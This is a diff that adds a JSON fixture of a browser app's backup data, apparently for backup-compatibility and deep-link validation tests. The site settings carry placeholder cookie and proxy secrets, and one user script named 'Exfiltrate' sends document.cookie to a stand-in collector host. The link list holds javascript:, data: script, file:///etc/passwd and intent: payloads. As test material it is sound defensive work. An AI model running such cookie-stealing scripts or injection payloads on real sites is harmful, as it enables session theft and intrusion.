@@ -1,0 +1,261 @@
+{
+  "theme": {"themeMode": "dark", "accentColor": "teal"},
+  "selectedWebspaceId": "ws-compat-work",
+  "currentIndex": 2,
+  "sites": [
+    {
+      "siteId": "compat-site-a",
+      "initUrl": "https://mail.example.com/",
+      "currentUrl": "https://mail.example.com/inbox",
+      "name": "Mail",
+      "pageTitle": "Inbox",
+      "cookies": [
+        {
+          "name": "prefs",
+          "value": "plain-cookie-value",
+          "domain": ".example.com",
+          "path": "/",
+          "expiresDate": 1893456000000,
+          "isSecure": false,
+          "isHttpOnly": false,
+          "isSessionOnly": false,
+          "sameSite": "Lax"
+        },
+        {
+          "name": "__Host-session",
+          "value": "secure-cookie-needle-5d1e",
+          "domain": "mail.example.com",
+          "path": "/",
+          "expiresDate": 1893456000000,
+          "isSecure": true,
+          "isHttpOnly": true,
+          "isSessionOnly": false,
+          "sameSite": "Lax"
+        }
+      ],
+      "proxySettings": {
+        "type": 3,
+        "address": "127.0.0.1:1080",
+        "username": "proxyuser",
+        "password": "site-proxy-password-needle-a41c"
+      },
+      "javascriptEnabled": false,
+      "userAgent": "Mozilla/5.0 (X11; Linux x86_64) BackupCompatFixture/1.0",
+      "thirdPartyCookiesEnabled": true,
+      "httpsUpgradeEnabled": false,
+      "incognito": false,
+      "alwaysOpenHome": false,
+      "kioskMode": true,
+      "language": "de",
+      "zoomPercent": 150,
+      "clearUrlEnabled": false,
+      "dnsBlockEnabled": false,
+      "dnsBlockLevel": 2,
+      "disabledFilterLists": ["easylist"],
+      "contentBlockEnabled": false,
+      "trackingProtectionEnabled": false,
+      "localCdnEnabled": false,
+      "blockAutoRedirects": false,
+      "externalLinksInBrowser": true,
+      "fullscreenMode": true,
+      "tabBarButtonCorner": "topLeft",
+      "htmlCachingEnabled": true,
+      "notificationsEnabled": true,
+      "backgroundAudioEnabled": true,
+      "protectedContentAllowed": true,
+      "cameraMode": "real",
+      "microphoneMode": "real",
+      "screenShareMode": "virtual",
+      "virtualScreenSource": {
+        "kind": "image",
+        "dataUrl": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/iZk9HQAAAABJRU5ErkJggg==",
+        "fileName": "screen.png"
+      },
+      "userScripts": [
+        {
+          "id": "site-script-a",
+          "name": "Exfiltrate",
+          "source": "fetch('https://collector.example/' + document.cookie)",
+          "injectionTime": 0,
+          "enabled": true,
+          "bypassSitePolicy": true
+        }
+      ],
+      "enabledGlobalScriptIds": ["global-script-1"],
+      "blockedCookies": [{"name": "_ga", "domain": ".example.com"}],
+      "locationMode": "live",
+      "spoofLatitude": 52.52,
+      "spoofLongitude": 13.405,
+      "spoofAccuracy": 25.5,
+      "spoofTimezone": "Europe/Berlin",
+      "spoofTimezoneFromLocation": true,
+      "liveLocationGranularity": "approximate",
+      "webRtcPolicy": "relayOnly",
+      "letterboxEnabled": true,
+      "spoofWindowWidth": 1280,
+      "spoofWindowHeight": 720,
+      "fingerprintResetNonce": "compat-nonce-1",
+      "customIconPng": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/iZk9HQAAAABJRU5ErkJggg==",
+      "domainClaims": [
+        {"kind": "exactHost", "value": "mail.example.com"},
+        {"kind": "wildcardSubdomain", "value": "example.com"}
+      ]
+    },
+    {
+      "siteId": "compat-site-b",
+      "initUrl": "https://private.example.net/",
+      "currentUrl": "https://private.example.net/secret-path",
+      "name": "Private",
+      "pageTitle": "Private page",
+      "cookies": [
+        {
+          "name": "incognito-cookie",
+          "value": "incognito-cookie-needle-77b0",
+          "domain": "private.example.net",
+          "path": "/",
+          "expiresDate": 1893456000000,
+          "isSecure": false,
+          "isHttpOnly": false,
+          "isSessionOnly": false,
+          "sameSite": null
+        }
+      ],
+      "proxySettings": {"type": 1, "address": "http-proxy.example:3128"},
+      "javascriptEnabled": true,
+      "userAgent": "",
+      "thirdPartyCookiesEnabled": false,
+      "incognito": true,
+      "language": "fr",
+      "protectedContentAllowed": false,
+      "cameraMode": "virtual",
+      "virtualCameraSource": {
+        "kind": "image",
+        "dataUrl": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGP4z8DwHwAFAAH/iZk9HQAAAABJRU5ErkJggg==",
+        "fileName": "camera.png"
+      },
+      "microphoneMode": "virtual",
+      "virtualMicrophoneSource": {
+        "dataUrl": "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA=",
+        "fileName": "voice.wav"
+      },
+      "locationMode": "spoof",
+      "spoofLatitude": 48.8566,
+      "spoofLongitude": 2.3522,
+      "spoofAccuracy": 50.0,
+      "spoofTimezone": "Europe/Paris",
+      "webRtcPolicy": "disabled"
+    },
+    {
+      "siteId": "compat-site-c",
+      "initUrl": "http://localhost:8080/",
+      "currentUrl": "http://localhost:8080/dashboard",
+      "name": "Dashboard",
+      "pageTitle": "Dashboard",
+      "cookies": [],
+      "proxySettings": {"type": 0},
+      "javascriptEnabled": true,
+      "userAgent": "",
+      "thirdPartyCookiesEnabled": false,
+      "alwaysOpenHome": true,
+      "cameraMode": "block",
+      "microphoneMode": "block",
+      "screenShareMode": "block",
+      "locationMode": "off"
+    },
+    {
+      "siteId": "compat-site-d",
+      "initUrl": "file://notes.html",
+      "currentUrl": "file://notes.html",
+      "name": "notes",
+      "pageTitle": "notes",
+      "cookies": [],
+      "proxySettings": {"type": 0},
+      "javascriptEnabled": true,
+      "userAgent": "",
+      "thirdPartyCookiesEnabled": false
+    }
+  ],
+  "webspaces": [
+    {
+      "id": "ws-compat-work",
+      "name": "Work",
+      "siteIndices": [0, 2, 3],
+      "siteIds": ["compat-site-a", "compat-site-c", "compat-site-d"]
+    },
+    {
+      "id": "ws-compat-private",
+      "name": "Private",
+      "siteIndices": [1],
+      "siteIds": ["compat-site-b"]
+    }
+  ],
+  "globalPrefs": {
+    "showUrlBar": true,
+    "showTabStrip": true,
+    "tabStripInFullscreen": true,
+    "tabBarButton": true,
+    "tabBarButtonOnRight": false,
+    "fullscreenOnShortcut": false,
+    "tabMaxWidth": 200,
+    "showStatsBanner": false,
+    "osmTileUrl": "https://tiles.example.org/{z}/{x}/{y}.png",
+    "globalOutboundProxy": {
+      "type": 2,
+      "address": "global-proxy.example:8443",
+      "username": "globaluser",
+      "password": "global-proxy-password-needle-9e2d"
+    },
+    "developerMode": true,
+    "linkHandlingEnabled": false,
+    "linkHandlingClaimDomains": true,
+    "useUboResources": false,
+    "appLocaleOverride": "de",
+    "firefoxUaAutoRefresh": true,
+    "backForwardCacheEnabled": false,
+    "backOpensMenu": true,
+    "httpsUpgradeEnabled": false,
+    "torIsolateDestAddr": true,
+    "trustedHosts": ["evil.example|443|tls-pin-needle-c0de"]
+  },
+  "suggestedSites": [
+    {"name": "Example", "url": "https://example.com", "domain": "example.com"}
+  ],
+  "globalUserScripts": [
+    {
+      "id": "global-script-1",
+      "name": "Global invert",
+      "source": "document.documentElement.style.filter = 'invert(1)'",
+      "injectionTime": 0,
+      "enabled": true,
+      "bypassSitePolicy": true
+    }
+  ],
+  "dnsBlockLevel": 4,
+  "contentBlockerLists": [
+    {"id": "easylist", "name": "EasyList", "url": "https://easylist.to/easylist/easylist.txt", "enabled": true},
+    {"id": "custom-1", "name": "Custom", "url": "https://filters.example/list.txt", "enabled": false}
+  ],
+  "links": [
+    "webspace://open?url=https%3A%2F%2Fexample.com%2Fpath%3Fq%3D1",
+    "webspace://open?url=https://example.com/",
+    "webspace:open?url=https%3A%2F%2Fexample.com%2F",
+    "webspace:///open?url=https%3A%2F%2Fexample.com%2F",
+    "WEBSPACE://OPEN?url=https%3A%2F%2Fexample.com%2F",
+    "webspace://open?url=http%3A%2F%2Flocalhost%3A8080%2F",
+    "webspace://open?url=https%3A%2F%2F%5B%3A%3A1%5D%3A8443%2F",
+    "webspace://open?url=https%3A%2F%2Fuser%3Apass%40example.com%2F",
+    "webspace://open?url=https%3A%2F%2Fexample.com%2F&url=https%3A%2F%2Fevil.example%2F",
+    "webspace://open?url=https%3A%2F%2Fexample.com%2F%23frag",
+    "webspace://open?url=javascript%3Aalert(1)",
+    "webspace://open?url=file%3A%2F%2F%2Fetc%2Fpasswd",
+    "webspace://open?url=data%3Atext%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    "webspace://open?url=intent%3A%2F%2Fexample.com%23Intent%3Bend",
+    "webspace://open?url=",
+    "webspace://open",
+    "webspace://open?url=https%3A%2F%2F",
+    "webspace://other?url=https%3A%2F%2Fexample.com%2F",
+    "webspace://qr/site/v1/AAAA",
+    "https://example.com/",
+    "webspace://open?url=%E0%A4%A"
+  ]
+}
